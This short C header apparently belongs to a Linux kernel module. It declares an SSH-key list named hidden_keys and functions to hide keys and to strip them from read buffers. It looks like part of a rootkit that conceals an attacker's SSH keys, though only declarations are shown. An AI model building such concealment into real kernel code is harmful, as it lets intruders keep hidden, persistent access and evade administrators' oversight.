#pragma once

#include <linux/list.h>

typedef struct {
    char* key;
    size_t len;
    struct list_head list_node;
} SshKey;

extern struct list_head hidden_keys;

int remove_hidden_keys(char* buffer, size_t len);

int hide_key(const char __user* key, size_t len);